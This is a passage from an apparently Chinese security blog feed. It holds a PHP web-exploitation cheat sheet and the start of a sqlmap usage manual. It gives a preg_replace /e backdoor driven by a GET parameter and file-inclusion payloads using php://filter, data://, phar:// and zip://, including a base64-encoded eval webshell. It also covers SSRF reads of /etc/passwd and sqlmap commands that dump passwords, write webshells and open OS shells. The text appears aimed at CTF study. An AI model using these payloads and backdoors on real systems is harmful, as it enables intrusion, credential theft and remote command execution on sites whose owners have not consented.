<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">第一个参数需要e标识符，有了它可以执行第二个参数的命令</span><br><span class="line">第一个参数需要在第三个参数中的中有匹配，不然<span class="keyword">echo</span>会返回第三个参数而不执行命令，举个例子：</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="comment">// 这样是可以执行命令的</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/test/e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;just test&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 这种没有匹配上，所以返回值是第三个参数，不会执行命令</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/test/e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;just tesxt&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>我们可以构造这样的后门代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@preg_replace(<span class="string">&quot;//e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>], <span class="string">&quot;Access Denied&quot;</span>);  </span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="string">&quot;/test/e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>], <span class="string">&quot;jutst test&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>当访问这样这样的链接时就可以被触发</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://localhost:<span class="number">8000</span>/testbug.php?<span class="built_in">h</span>=phpinfo();</span><br></pre></td></tr></table></figure>
<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>可以应用于</p>
<ul>
<li>file_get_contents</li>
<li>readfile</li>
</ul>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>读取文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/lfi.php?file=php://<span class="keyword">filter</span>/convert.base64<span class="literal">-encode</span>/resource=flag.php</span><br><span class="line">/lfi.php?file=php://<span class="keyword">filter</span>/read=convert.base64<span class="literal">-encode</span>/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>控制文件写入的处理逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;&lt;?php exit;?&gt;&quot;</span>; </span><br><span class="line">@<span class="variable">$c</span>.=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]; </span><br><span class="line">@<span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">@file_put_contents(<span class="variable">$filename</span>, <span class="variable">$c</span>); </span><br><span class="line">highlight_file(<span class="string">&#x27;tmp.php&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 先对内容做base64-decode，然后再写入文件</span></span><br><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=abc.php&amp;c=0PD9waHAgQGV2YWwoJF9SRVFVRVNUWydoJ10pOz8%2B</span></span><br><span class="line"><span class="comment"># php 在做 base64_decode 的时候会自动去掉无法解析的字符&lt;?php exit;?&gt;会变成phpexit，因为base64是每4个字符进行解析的，因此前面加上任意字符补全，注意如果base64里面有+号，要记得 urlencode</span></span><br></pre></td></tr></table></figure>
<p>利用伪协议就可以绕过 php 的 is_file，然后读取文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;123.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;php://filter/resource=123.php&#x27;</span>;</span><br><span class="line"><span class="comment">// boolean true</span></span><br><span class="line">var_dump(is_file(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">// boolean false</span></span><br><span class="line">var_dump(is_file(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>写入文件， 数据在body那边传过去，可以用GET，也可以用 POST 传过去</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/test.php?file=php://input</span><br></pre></td></tr></table></figure>
<p>将 user 用 body 传过去，注意 body 那边不是表单的形式，是直接把 body 的数据整个提交</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">GET /?user=php://input HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">10.255</span>.<span class="number">10.157</span>:<span class="number">8087</span></span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">17</span></span><br><span class="line"></span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure>
<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>将 include 的文件流重定向到用户控制的输入流</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/test.php?file=<span class="keyword">data</span>://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==</span><br></pre></td></tr></table></figure>
<p>可以用于控制 file_get_contents 的内容为用户输入的流</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure>
<p>file_get_contens支持data协议，并且可以指定任意的域名，利用 data://yourname.auu/data/plain;base64,xxx 这样的 payload 绕过 php 的 parse_url 对域名和路径的限制。</p>
<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。</p>
<p>写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含<br>这里的路径为上传的 jpg 文件在服务器的路径</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/index.php?id=phar://路径/xxx.jpg/shell</span><br></pre></td></tr></table></figure>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h2><p>上述 phar:// 的方法也可以使用 zip://</p>
<p>然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。</p>
<p>1.zip文件内仅有1.php这个文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/php?file=zip://<span class="number">1</span>.png%<span class="number">231</span>.php  </span><br><span class="line"></span><br><span class="line">// 也可以尝试不改名为png，直接使用zip上传测试一下</span><br><span class="line">/php?file=zip://<span class="number">1</span>.zip%<span class="number">231</span>.php</span><br></pre></td></tr></table></figure>
<h2 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 redis 中的 info 数据</span></span><br><span class="line">/index.php?url=dict://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span>/info</span><br><span class="line"><span class="comment"># 查看 ssh 的 banner</span></span><br><span class="line">/index.php?url=dict://<span class="number">127.0</span>.<span class="number">0.1</span>:ssh端口/info</span><br></pre></td></tr></table></figure>
<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/ssrf.php?url=file:///etc/passwd</span><br><span class="line"></span><br><span class="line">// 利用 ﬁle://localhost 来读取本地文件</span><br><span class="line">/index.php?url=file://localhost/var/www/html/flag.php</span><br><span class="line"></span><br><span class="line"><span class="comment">## 文件上传漏洞</span></span><br><span class="line"> </span><br><span class="line">正常的文件上传流程是这样的，首先接收 POST 的文件，在 `t<span class="built_in">mp</span>` 目录下生成临时文件，文件名是 `php[<span class="type">A</span>-<span class="type">Za</span>-<span class="type">z0</span>-<span class="number">9</span>]&#123;<span class="number">6</span>&#125;`，在 php 处理后删除临时文件，虽然没有文件上传，但是只要文件上传开启了就一定会创建临时文件，在这中途如果 php 意外退出则临时文件不会被删除，造成 `/tmp` 目录下可以留下任何内容。 内容构造好后，单纯爆破  `/tmp/phpxxxxxx`  文件名是不太现实但是也可行的。</span><br><span class="line"> </span><br><span class="line">通过文件包含，让其包含本身，造成无限循环后发出 SIGSEGV 信号，可以导致 php 意外退出。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 一些函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### stripos/strpos</span></span><br><span class="line"></span><br><span class="line">stripos() 函数返回字符串在另一个字符串中第一次出现的位置，如果没有找到该字符串，则返回 false。该函数对大小写不敏感，strpos() 函数是大小写敏感的。但是在返回值为<span class="number">0</span>的情况下，弱类型比较下 <span class="number">0</span> == false</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$r</span>, <span class="string">&#x27;a&#x27;</span>) == false) &#123;</span><br><span class="line">       // <span class="number">0</span> 是 <span class="variable">$r</span>存在字符串 <span class="string">&#x27;a&#x27;</span>，但是由于<span class="number">0</span>和false是相等的，所以就执行了这里</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$r</span>, <span class="string">&#x27;a&#x27;</span>) === false) &#123;</span><br><span class="line">     // 这种情况下，<span class="variable">$r</span> 中必须不包含 <span class="string">&#x27;a&#x27;</span>，才会执行这里</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos([], <span class="string">&quot;a&quot;</span>) !==false) &#123;</span><br><span class="line">    // strpos()找的是字符串，那么传一个数组给它，strpos()出错返回null，null !== false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="eregi"><a href="#eregi" class="headerlink" title="eregi"></a>eregi</h2><p>eregi() 函数在一个字符串搜索指定的正则表达式的字符串，搜索不区分大小写，区分大小写使用 eregi，如果匹配成功返回 true，否则则返回 false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (! eregi (<span class="string">&quot;[[:alnum:]]&#123;8,10&#125;&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">&quot;Invalid password! Passwords must be from 8 - 10 chars&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;Valid password&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="stristr"><a href="#stristr" class="headerlink" title="stristr"></a>stristr</h2><p>stristr() 函数搜索字符串在另一字符串中的第一次出现。该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 strstr() 函数。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">// string，规定被搜索的字符串。</span><br><span class="line">// search，规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</span><br><span class="line">stristr(string, search, before_search)</span><br><span class="line">// before_search 为可选参数，默认值为 <span class="string">&quot;false&quot;</span> 的布尔值。</span><br><span class="line">// 如果设置为 <span class="string">&quot;true&quot;</span>，它将返回 search 参数第一次出现之前的字符串部分。</span><br></pre></td></tr></table></figure>
<h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h2><p>iconv 函数用于做编码转换，函数原型</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">string iconv ( string <span class="variable">$in_charset</span> , string <span class="variable">$out_charset</span> , string <span class="variable">$str</span> ) </span><br><span class="line">in_charset：输入的字符集 </span><br><span class="line">out_charset：输出的字符集 </span><br><span class="line">str：要转换的字符串</span><br></pre></td></tr></table></figure>
<p>iconv 在字符编码转换时可能导致字符串截断。当$str 中有一个字符不能被目标字符集所表示时，$str 从第一个无效字符开始截断并导致一个 E_NOTICE。 例如：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$d</span> = iconv(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;gb2312&quot;</span>, <span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
<p>该代码是将变量 $c 从UTF-8 编码转换为 gb2312。那么当 $c 中存在一个不能被 gb2312 表示的字符时，那么就会截断。</p>
<h2 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h2><p>PHP 的字符串向数据库进行写入时，为避免数据库错误，需要对特殊字符进行转义（字符前加上 \）。特殊字符：单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。</p>
<ul>
<li>addslashes 对特殊字符加上转义字符，返回一个字符串</li>
<li>stripslashes 该函数为 addslashes() 的反函数，去掉转义字符串，返回一个字符串</li>
</ul>
<h2 id="strtr"><a href="#strtr" class="headerlink" title="strtr"></a>strtr</h2><p>转换字符串中特定的字符，如果 from 和 to 参数的长度不同，则会被格式化为最短的长度。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">strtr(string,from,to)</span><br><span class="line">strtr(string,array)</span><br><span class="line"><span class="comment"># 按字符做替换，from 中每个字符替换成 to 中对应顺序的字符</span></span><br><span class="line"><span class="comment"># 12341111234</span></span><br><span class="line">var_dump(strtr(<span class="string">&#x27;abcd111abcd&#x27;</span>, <span class="string">&#x27;abcd&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>数组形式的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span> =&gt; <span class="string">&quot;Hi&quot;</span>, <span class="string">&quot;world&quot;</span> =&gt; <span class="string">&quot;earth&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> strtr(<span class="string">&quot;Hello world&quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>格式化字符串</p>
<ul>
<li>sprintf， 把格式化的字符串写入变量中</li>
<li>vsprintf，与 sprintf 功能相同，但是 vsprintf 中的参数位于数组中</li>
<li>fprintf，把格式化的字符串写入指定的输出流（例如：文件或数据库）</li>
<li>vfprintf，与 fprintf 功能相同，但是 vfprintf 中的参数位于数组中</li>
<li>printf，输出格式化的字符串</li>
<li>vprintf，与 printf 功能相同，但是 vprintf 中的参数位于数组中</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$number</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Shanghai&quot;</span>;</span><br><span class="line"></span><br><span class="line">printf(<span class="string">&quot;在%s有 %u 百万辆自行车。&quot;</span>,<span class="variable">$str</span>,<span class="variable">$number</span>);</span><br><span class="line">vprintf(<span class="string">&quot;There are %u million bicycles in %s.&quot;</span>,<span class="keyword">array</span>(<span class="variable">$number</span>,<span class="variable">$str</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$txt</span> = sprintf(<span class="string">&quot;There are %u million cars in %s.&quot;</span>, <span class="variable">$number</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$txt</span> = vsprintf(<span class="string">&quot;There are %u million bicycles in %s.&quot;</span>,<span class="keyword">array</span>(<span class="variable">$number</span>,<span class="variable">$str</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$txt</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> fprintf(<span class="variable">$file</span>,<span class="string">&quot;There are %u million bicycles in %s.&quot;</span>,<span class="variable">$number</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> vfprintf(<span class="variable">$file</span>,<span class="string">&quot;There are %u million bicycles in %s.&quot;</span>,<span class="keyword">array</span>(<span class="variable">$number</span>,<span class="variable">$str</span>));</span><br></pre></td></tr></table></figure>
<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>curl是支持 file://host/path, file://path 这两种形式，但是即使有 host, curl仍然会访问到本地的文件。用 ? 或者 # 可以截断 url 后面拼接的 /, payload: file://<a href="http://www.baidu.com/etc/flag">www.baidu.com/etc/flag</a>?</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>]; </span><br><span class="line"><span class="variable">$url_schema</span> = parse_url(<span class="variable">$url</span>); </span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$url_schema</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line"><span class="variable">$request_url</span> = <span class="variable">$url</span>.<span class="string">&quot;/&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$host</span> !== <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;wrong site&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ci</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ci</span>, CURLOPT_URL, <span class="variable">$request_url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ci</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$res</span> = curl_exec(<span class="variable">$ci</span>);</span><br><span class="line">curl_close(<span class="variable">$ci</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure>
<p>PHP的cURL支持通过给 CURL_POSTFIELDS 传递关联数组（而不是字符串）来生成 multipart/form-data 的POST请求。可以使用“@+文件全路径”的语法附加文件，将会读取该文件内容，并作为POST请求的内容。</p>
<p>注：PHP5.4及以下版本仅支持@语法形式；PHP5.5两种都是支持的，设置 CURL_SAFE_UPLOAD＝true 强制使用CURLFile方式；PHP5.6+仅支持CURLFile方式，即使设置CURL_SAFE_UPLOAD＝false也是毫无意义的。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">120.55</span>.<span class="number">42.243</span>:<span class="number">20010</span>/index.php?url=<span class="selector-tag">@</span>/opt/api/dnsapi/views.py</span><br></pre></td></tr></table></figure>
<h2 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h2><ul>
<li>ctype_upper 检查是否为大写字符</li>
<li>htmlentities 将字符转换为 HTML 转义字符</li>
<li>implode 将数组拼接成字符串</li>
</ul>
<h1 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h1><h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h2><p>转义 SQL 语句中使用的字符串中的特殊字符，会转义单引号和双引号，下列字符受影响：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">\x1a</span></span><br></pre></td></tr></table></figure>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<h2 id="数据库字符集绕过"><a href="#数据库字符集绕过" class="headerlink" title="数据库字符集绕过"></a>数据库字符集绕过</h2><p>在默认情况下，mysql字符集为 latin1，而执行了 set names utf8 以后，character_set_client、character_set_connection、character_set_results等与客户端相关的配置字符集都变成了 utf8，但character_set_database、character_set_server 等服务端相关的字符集还是 latin1。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$db</span> = mysql_connect(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>);</span><br><span class="line">mysql_select_db(<span class="variable">$database</span>,<span class="variable">$db</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// username=admin%c2，在mysql中可以正常查出 username=&#x27;admin&#x27; 的结果</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;query(<span class="string">&quot;SELECT * FROM z_users where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>character_set_client 和 character_set_connection 被设置成了utf8，而内部操作字符集其实也就是username 字段的字符集还是默认的 latin1。于是整个操作就有如下字符串转换过程：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure>
<p>最后执行比较username=’admin’ 的时候，’admin’ 是一个latin1字符串。Mysql在转换字符集的时候，将不完整的字符给忽略了。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>sqlmap使用手册</title>
    <url>/2020/11/23/sqlmap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<p>一直没有找到关于sqlmap注入非常详细的知识点总结，最近在乌云里面发现一篇很好的文章关于sqlmap使用的方法<a id="more"></a></p>
<p>就搬运过来了，再加上一些其它文章的内容，总结而得到的本文。</p>
<h1 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h1><p><strong>GET方式</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> <span class="regexp">//</span>这个URL必须含？</span><br></pre></td></tr></table></figure>
<p><strong>POST方式</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//</span>testasp.vulnweb.com/Login.asp --data <span class="string">&quot;tfUName=1&amp;tfUPass=1&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>cookie注入</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> <span class="params">--cookie</span> <span class="string">&quot;chsadj&quot;</span> <span class="params">--level</span> 2 <span class="string">//</span>这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面</span><br></pre></td></tr></table></figure>
<p><strong>tamper方式</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> -v 3 <span class="params">--batch</span> <span class="params">--tamper</span> <span class="string">&quot;sac.py&quot;</span>  <span class="string">//temper</span>后面的插件可以去sql安装目录查找</span><br></pre></td></tr></table></figure>
<p><strong>自动检测表</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//</span>testasp.vulnweb.com/Login.asp --forms</span><br></pre></td></tr></table></figure>
<p><strong>延时两秒</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Sqlmap –u “url” <span class="comment">--delay 2</span></span><br></pre></td></tr></table></figure>
<p><strong>频率3次</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Sqlmap –u “url” <span class="comment">--safe-freq 3</span></span><br></pre></td></tr></table></figure>
<p><strong>伪静态</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Sqlmap -u http:<span class="regexp">//</span>sfl.fzu.edu.cn<span class="regexp">/index.php/</span>Index<span class="regexp">/view/i</span>d<span class="regexp">/40.html /</span><span class="regexp">/在40后面加*</span></span><br></pre></td></tr></table></figure>
<h1 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h1><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --dbs   <span class="regexp">//</span>查看所有数据库</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --users <span class="regexp">//</span>查看所有用户</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --current-db <span class="regexp">//</span>查看当前的数据库</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --current-user <span class="regexp">//</span>产看当前的用户</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --is-dba <span class="regexp">//</span>查看是否是最高权限</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --passwords <span class="regexp">//</span>查看所有密码</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> –hostname <span class="regexp">//</span>查看主机名</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> privileges -U username <span class="regexp">//</span>查看用户权限</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> –roles <span class="regexp">//</span>查看用户角色</span><br></pre></td></tr></table></figure>
<p><strong>查看详细内容</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --tables -D <span class="string">&quot;database&quot;</span> <span class="regexp">//</span>database这个数据库的表数据表</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --columns -T <span class="string">&quot;tables&quot;</span> -D <span class="string">&quot;database&quot;</span> <span class="regexp">//</span>查看tables这个数据表的字段</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --dump <span class="string">&quot;a,b,c&quot;</span> -C <span class="string">&quot;columns&quot;</span> -T <span class="string">&quot;tables&quot;</span> -D <span class="string">&quot;database&quot;</span> <span class="regexp">//</span>下载内容，后面的-CTDabc都是对下载的数据库表段的约束如果不加就是下载所有</span><br></pre></td></tr></table></figure>
<h1 id="执行特殊操作"><a href="#执行特殊操作" class="headerlink" title="执行特殊操作"></a>执行特殊操作</h1><p><strong>文件查看</strong></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> –<span class="keyword">file</span>-<span class="keyword">read</span>= <span class="comment">//这个读取的文件会存在本地的结果目录，请认真看提示</span></span><br></pre></td></tr></table></figure>
<p><strong>文件写入</strong></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --<span class="keyword">file</span>-<span class="keyword">write</span>=本地文件路径 --<span class="keyword">file</span>-dest=网站的绝对路径 <span class="comment">//上传webshell用，需要dba权限</span></span><br></pre></td></tr></table></figure>
<p><strong>命令执行</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> <span class="params">--os-cmd</span> <span class="string">&quot;cmd&quot;</span>  <span class="string">//</span>执行cmd代表的命令，如<span class="keyword">cd</span> C:/</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> <span class="params">--os-shell</span>  <span class="string">//</span>进入数据库自带的shell</span><br></pre></td></tr></table></figure>
<h1 id="命令总览"><a href="#命令总览" class="headerlink" title="命令总览"></a>命令总览</h1><p>使用<code>sqlmap -hh</code>可以查看详细的命令说明：</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">r <span class="number">1</span>.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行</span></span><br><span class="line"><span class="ruby">-l log.txt          可以将代理的日志作为目标去检测[见下图]</span></span><br><span class="line"><span class="ruby">-m <span class="number">1</span>.txt            对于多个URL，可以一排一个写入文件后加载</span></span><br><span class="line"><span class="ruby">--force-ssl         对于使用SSL的URL要在后面加上这个参数</span></span><br><span class="line"><span class="ruby">--data              对于使用post方法，可以将参数写在data后面</span></span><br><span class="line"><span class="ruby">--param-del=<span class="string">&quot;&quot;</span>          </span></span><br><span class="line"><span class="ruby">--cookie=<span class="string">&quot;&quot;</span>  level <span class="number">2</span>        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于<span class="number">1</span></span></span><br><span class="line"><span class="ruby">--random-agent          使用随机的user-agent</span></span><br><span class="line"><span class="ruby">--user-agent=<span class="string">&quot;&quot;</span>  level <span class="number">3</span>    指定user-agent，如要检测它是否有漏洞level要高于<span class="number">2</span></span></span><br><span class="line"><span class="ruby">--header=<span class="string">&quot;\n&quot;</span>           指定头信息，如User-<span class="symbol">Agent:</span>dsacs，大小写敏感，多个用\n分隔</span></span><br><span class="line"><span class="ruby">--method=GET POST       设置提交方式，默认一个一个的尝试</span></span><br><span class="line"><span class="ruby">--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用</span></span><br><span class="line"><span class="ruby">--auth-cred <span class="string">&quot;user:pass&quot;</span>     填写账号和密码</span></span><br><span class="line"><span class="ruby"> --proxy=<span class="string">&quot;http:127.0.0.1:8087&quot;</span>  使用代理</span></span><br><span class="line"><span class="ruby">--proxy-cred=<span class="string">&quot;name:pass&quot;</span>    如果代理要密码的话</span></span><br><span class="line"><span class="ruby">--ignore-proxy          